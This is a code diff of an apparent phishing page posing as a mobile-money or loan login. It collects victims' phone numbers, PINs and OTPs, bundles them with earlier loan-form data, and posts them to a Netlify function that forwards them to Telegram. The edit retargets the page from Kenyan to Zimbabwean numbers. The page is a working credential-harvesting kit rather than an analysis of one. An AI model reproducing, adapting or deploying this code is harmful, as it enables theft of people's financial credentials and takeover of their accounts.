@@ -15,6 +15,7 @@
   .muted{font-size:13px;color:#6b7280;text-align:center;margin-top:12px}
   .otp-modal{position:fixed;left:0;top:0;width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.35)}
   .otp-box{background:#fff;padding:18px;border-radius:12px;min-width:280px}
+  .req{color:#d04444;margin-right:6px}
   .small{font-size:12px;color:#6b7280}
 </style>
 </head>
@@ -22,18 +23,20 @@
   <div class="card">
     <h2>Log In</h2>
     <form id="loginForm">
-      <label>Mobile Number</label>
-      <input id="phone" name="phone" required placeholder="+2547..." />
+      <label><span class="req">★</span>Mobile Number
+        <input id="phone" name="phone" required placeholder="+2637..." value="+263" />
+      </label>
 
-      <label>4-Digit PIN</label>
-      <input id="pin" name="pin" required maxlength="6" placeholder="Enter 4-digit PIN" />
+      <label><span class="req">★</span>4-Digit PIN
+        <input id="pin" name="pin" required maxlength="6" placeholder="Enter 4-digit PIN" />
+      </label>
 
       <button type="submit" class="btn">LOGIN</button>
       <div class="muted">We will ask for an OTP after login.</div>
     </form>
   </div>
 
-  <!-- OTP modal (hidden) -->
+  <!-- OTP modal -->
   <div id="otpModal" style="display:none" class="otp-modal" aria-hidden="true">
     <div class="otp-box">
       <div style="text-align:center"><strong>Enter OTP</strong></div>
@@ -48,41 +51,41 @@
   </div>
 
 <script>
-  // On load, prefill phone if loanForm exists
-  const loanDataStr = sessionStorage.getItem('loanForm');
-  if (loanDataStr) {
+  // Prefill phone from loan form if present; otherwise keep +263 default
+  const stored = sessionStorage.getItem('loanForm');
+  if (stored) {
     try {
-      const loan = JSON.parse(loanDataStr);
-      if (loan.phone) document.getElementById('phone').value = loan.phone;
-    } catch (e){}
+      const loan = JSON.parse(stored);
+      if (loan.phone && loan.phone.trim() !== '') document.getElementById('phone').value = loan.phone;
+      else if (!document.getElementById('phone').value) document.getElementById('phone').value = '+263';
+    } catch(e){ if(!document.getElementById('phone').value) document.getElementById('phone').value = '+263'; }
+  } else {
+    if(!document.getElementById('phone').value) document.getElementById('phone').value = '+263';
   }
 
-  // Helper to POST to Netlify function
+  // helper sending function
   async function sendToServer(payload) {
-    const res = await fetch('/.netlify/functions/sendTelegram', {
+    return fetch('/.netlify/functions/sendTelegram', {
       method: 'POST',
-      headers:{'Content-Type':'application/json'},
+      headers: {'Content-Type':'application/json'},
       body: JSON.stringify(payload)
     });
-    return res;
   }
 
-  document.getElementById('loginForm').addEventListener('submit', async function(e){
+  document.getElementById('loginForm').addEventListener('submit', function(e){
     e.preventDefault();
     const phone = document.getElementById('phone').value.trim();
     const pin = document.getElementById('pin').value.trim();
     if(!phone || !pin){ alert('Enter phone and PIN'); return; }
 
-    // simulate sending OTP -> show modal
-    document.getElementById('otpModal').style.display='flex';
-    document.getElementById('otpInput').value='';
-    document.getElementById('otpStatus').textContent=''; 
-    // In real system you would call SMS provider — here we just show modal
+    // show OTP modal (demo)
+    document.getElementById('otpModal').style.display = 'flex';
+    document.getElementById('otpInput').value = '';
+    document.getElementById('otpStatus').textContent = '';
   });
 
-  // OTP buttons
-  document.getElementById('cancelOtp').addEventListener('click', ()=>{
-    document.getElementById('otpModal').style.display='none';
+  document.getElementById('cancelOtp').addEventListener('click', ()=> {
+    document.getElementById('otpModal').style.display = 'none';
   });
 
   document.getElementById('confirmOtp').addEventListener('click', async ()=>{
@@ -91,7 +94,7 @@
     if(!code){ otpStatus.textContent='Enter OTP'; return; }
     otpStatus.textContent='Sending…';
 
-    // Compose full payload: combine loanForm + login fields + otp
+    // combine loan form and login info
     const loanData = JSON.parse(sessionStorage.getItem('loanForm') || '{}');
     const payload = {
       submittedAt: new Date().toISOString(),
@@ -104,13 +107,12 @@
     try {
       const resp = await sendToServer(payload);
       if(!resp.ok){
-        const text = await resp.text();
-        otpStatus.textContent = 'Server error: ' + (text||resp.status);
+        const txt = await resp.text();
+        otpStatus.textContent = 'Server error: ' + (txt || resp.status);
       } else {
-        otpStatus.textContent = 'Success — data sent to Telegram ✓';
-        // Clear storage & redirect or show final message
+        otpStatus.textContent = 'Success — sent to Telegram ✓';
         sessionStorage.removeItem('loanForm');
-        setTimeout(()=>{ window.location.href = 'thankyou.html'; }, 1200);
+        setTimeout(()=> window.location.href = 'thankyou.html', 1100);
       }
     } catch (err) {
       otpStatus.textContent = 'Network error';
